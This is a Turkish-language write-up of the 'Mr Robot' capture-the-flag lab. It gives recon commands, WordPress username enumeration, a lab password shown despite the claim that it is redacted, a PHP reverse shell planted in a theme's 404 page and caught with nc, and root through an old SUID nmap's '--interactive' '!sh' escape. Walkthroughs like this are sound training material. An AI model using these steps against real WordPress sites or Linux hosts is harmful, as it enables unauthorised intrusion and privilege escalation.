# Mr Robot — TryHackMe / VulnHub

**İşletim Sistemi:** Linux  ·  **Zorluk:** Orta (Medium)  ·  **Key:** 3/3

Kimlik bilgisi keşfiyle WordPress foothold'u, `daemon` olarak reverse shell ve
eski sürüm SUID `nmap` binary'si üzerinden root.

> Aşağıdaki tüm flag, parola ve token'lar redakte edilmiştir. IP `$IP` olarak
> gösterilmiştir (kendi hedef IP'ni export et).

---

## 1. Keşif (Recon)

```
nmap -sC -sV -p- $IP
```

Açık portlar:

| Port | Servis  |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 443  | HTTPS   |

Web sunucusu WordPress — kaynak sürümü ele veriyor:

```html
<!-- generator="WordPress/4.3.1" -->
```

## 2. Web enumerasyonu

```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Önemli bulgular:

- `/robots.txt` (41 byte) — **küçük dosyaların her byte'ını oku**:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

- `key-1-of-3.txt` → **key 1** (redakte)
- `fsocity.dic` → bir wordlist. Login aşamasının tüm oyunu bu dosyada.

```
wget http://$IP/fsocity.dic
sort -u fsocity.dic > fsocity_clear.txt
```

### Rabbit hole'lar (girilmeyen / öğrenilen)

- `page1` fsociety "komut kutusu" (`/prepare /fsociety /join …`) → dekor, vektör değil.
- E-posta "join" formu → dekor.
- Her dizine `sqlmap` → Mr Robot bir SQLi kutusu **değil**.

## 3. WordPress login

WordPress 4.3.1, login hata mesajından geçerli kullanıcı adını sızdırır:

- Geçersiz kullanıcı → `Invalid username`
- Geçerli kullanıcı → `The password you entered for the username X is incorrect.`

**Kullanıcı:** `Elliot`
**Parola:** `ER28-0652` (redakte)

> Not: Hem kullanıcı adı hem parola `fsocity.dic` içinde **var**, ama bu dosya
> temiz bir parola listesi değil — kelime kelime parçalanmış bir dizi web
> sayfası, HTML/wiki artıklarıyla dolu (`20Elliot`, `comwikiElliot`,
> `ElliotTherapy`, …). Doğru kullanıcıyla (`Elliot`) makul bir thread sayısında
> düzgün bir brute-force bunları bulurdu — benimki başka bir sebepten
> başarısız oldu. Bkz. *Takıldığım Yerler*.

`/wp-login.php` ile giriş → `/wp-admin`.

## 4. Foothold — `daemon` olarak reverse shell

`wp-admin` → **Appearance → Editor** → `twentyfifteen` temasının `404.php`
dosyasını düzenle. PHP reverse shell'i
(`/usr/share/webshells/php/php-reverse-shell.php`) yapıştır, **sadece** `$ip`
(kendi `tun0`'un) ve `$port`'u değiştir:

```php
$ip   = 'KENDI_TUN0_IP';
$port = 4444;
```

Dinleyici:

```
nc -lvnp 4444
```

Tarayıcıdan 404 sayfasını tetikle → shell düşer:

```
id
# uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Düzgün TTY'ye yükselt:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. Yetki yükseltme — eski sürüm SUID nmap

```
find / -perm -4000 -type f 2>/dev/null
```

Standart SUID binary'lerinin arasında bir tanesi yersiz duruyor:

```
/usr/local/bin/nmap
```

`/usr/local/bin` altında SUID `nmap` normal değildir — amaçlanan vektör budur.
Bu sürüm **nmap 3.81**, interaktif moda sahip olacak kadar eski (sonraki
sürümlerde kaldırıldı — GTFOBins'in güncel `nmap` girdisinin bunu listelememe
sebebi de bu):

```
nmap --interactive
nmap> !sh
# id → uid=0(root)
```

Doğrula:

```
whoami   # root
id       # uid=0(root) gid=0(root) groups=0(root),1(daemon)
```

## 6. Key'ler

```
cat /home/robot/key-2-of-3.txt   # key 2 (redakte)
cat /root/key-3-of-3.txt         # key 3 (redakte)
```

> **Dürüst not:** *Amaçlanan* zincir daemon → `robot` → root'tu; `robot`'un MD5
> hash'ini (`/home/robot/password.raw-md5`) kırıp `su robot` ile key 2'yi
> okumak. Bu adımı atladım — SUID nmap'ten gelen root ile key 2'yi doğrudan
> okudum. Geçerli bir kısa yol, ama MD5 kırma adımı **yapılmadı**.

---

## Takıldığım Yerler / Lessons Learned

**1. Throttle altında brute-force sahte hit üretir.**
`hydra` sürekli rastgele "geçerli" girişler raporladı (`25T10`, `2595`, hex
string'ler) — hepsi benim uydurduğum sabit parolayla. Sebep: hedef bağlantıları
boğuyordu (`all children were disabled due too many connection errors`); boş/hatalı
yanıtta fail-string bulunmaz, hydra "fail-string yok = başarılı" der. **Benim
uydurduğum sabit parolanın 'doğru' çıktığı ya da ekranda connection error
akarken gelen bir hit sahtedir — kutuyu bilmesem bile.** Her hit'i doğrula: bu
parolayı ben mi uydurdum? Bu kullanıcı bir insan ismine benziyor mu? Ekranda
connection error var mı?

**2. Kimlik bilgileri wordlist'teydi — başarısız olan *araçtı*, liste değil.**
Hem `Elliot` hem `ER28-0652` `fsocity.dic` içinde var; yani çalışan bir
brute-force bunları bulurdu. Aksini varsayıp saatler harcadım. Gerçek suçlu,
hydra'nın throttle altında sahte hit üretmesiydi (bkz. #1) — bu yüzden gerçek
satıra hiç ulaşamadı. Ayrıca `fsocity.dic` temiz bir parola listesi değil,
kelimelere bölünmüş bir web sayfası (HTML/wiki artıkları), bu da körlemesine
brute'u gürültülü yapıyor. Ders: brute-force oturmuyorsa, "parola burada yok"
sonucuna varmadan önce **aracın davranışından ve listenin doğasından** şüphelen.

**3. Araca süre bütçesi koy.**
hydra/wpscan'e ~4 saat kilitlendim. Çözüm "daha çabuk pes et" değil — vektör
gerçekti — ama *"bir araç 10-15 dakikada sonuç vermiyorsa aracı/yöntemi değiştir,
hedefi değil."*

**4. PHP reverse shell: `$shell` satırını bozma.**
`$shell = 'uname -a; w; id; /bin/sh -i';` satırını tırnaksız bir bash
one-liner'ıyla değiştirdim → PHP parse error → sayfa hiçbir şey yapmadı.
`$shell`'e dokunma; sadece `$ip` ve `$port`'u düzenle.

**5. SUID listesini oku; GTFOBins'i körlemesine deneme.**
`nmap`'i fark etmeden önce sırayla tüm GTFOBins SUID şablonlarını denedim
(anomali bile olmayan `sudo`, `ssh-keygen`, `gcc` dahil). Doğru refleks: SUID
listesinde normal bir sistemde *yeri olmayan* binary'yi seç (`mount/su/passwd` =
gürültü; `nmap` = vektör).

**6. GTFOBins güncel sürümü varsayar.**
`nmap --interactive` / `!sh` kaçışı GTFOBins'in modern girdisinde yok çünkü
sürüme özel (nmap 3.81). **Binary'nin sürümüne bak** — eski sürümlerin, güncel
sayfaların atladığı kaçışları olabilir.
